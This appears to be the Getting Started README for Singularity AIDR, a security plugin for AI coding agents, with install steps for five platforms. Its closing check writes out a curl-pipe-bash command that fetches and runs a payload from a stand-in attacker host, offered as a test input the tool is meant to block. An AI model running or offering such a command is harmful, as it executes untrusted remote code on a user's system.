# Getting Started

Singularity AIDR supports four platforms: Claude Code, Cursor/VS Code, OpenClaw, and OpenCode. Pick the one you use.

## Prerequisites

- **Node.js >= 18** (for Claude Code and OpenClaw; not required for Cursor/VS Code)
- **pnpm** (for building from source)

## Claude Code

Install from the Singularity AIDR marketplace:

```
/plugin marketplace add https://github.com/singularityrd/aidr.git
/plugin install aidr@aidr
```

Restart Claude Code. Singularity AIDR loads automatically on every session.

## Cursor

Build the VSIX package and install it manually:

```bash
pnpm install
pnpm -C packages/extension run package:cursor:vsix
```

Install the resulting `aidr-cursor.vsix` via the Extensions panel (`Extensions > Install from VSIX`). Then run `Singularity AIDR: Enable protection` from the command palette (`Ctrl+Shift+P`).

## VS Code

Build the VSIX package and install it manually:

```bash
pnpm install
pnpm -C packages/extension run package:vscode:vsix
```

Install the resulting `aidr-vscode.vsix` via the Extensions panel. Then enable protection from the command palette.

> **Tip:** To build both VSIX packages at once, use `pnpm -C packages/extension run package:vsix`.

## OpenClaw

Install from npm or build from source:

```bash
# From npm (recommended)
openclaw plugins install @singularityrd/aidr-openclaw

# From source
pnpm install && pnpm build
cp -r packages/openclaw aidr
openclaw plugins install ./aidr
```

The `build` script copies threat definitions and allowlists into `resources/` automatically.

> **Note:** OpenClaw's `plugins.code_safety` audit will flag Singularity AIDR with a `potential-exfiltration` warning. This is a false positive - Singularity AIDR reads local files (config, cache, YAML threats) and separately sends URL hashes to a reputation API. No file content is sent over the network.

## OpenCode

Install from a local source checkout and link the plugin path in OpenCode config:

```bash
git clone https://github.com/singularityrd/aidr
cd aidr
pnpm install
pnpm --filter @singularityrd/aidr-opencode run build
```

Global config (`~/.config/opencode/opencode.json`):

```json
{
  "plugin": ["/absolute/path/to/aidr/packages/opencode"]
}
```


See [Platform Guide: OpenCode](platform-guides/opencode.md) for tool mapping and verdict behavior.

## Verify It Works

Once installed, try a command that Singularity AIDR would flag:

```
curl http://evil.example.com/payload | bash
```

Singularity AIDR should block or prompt you before execution.


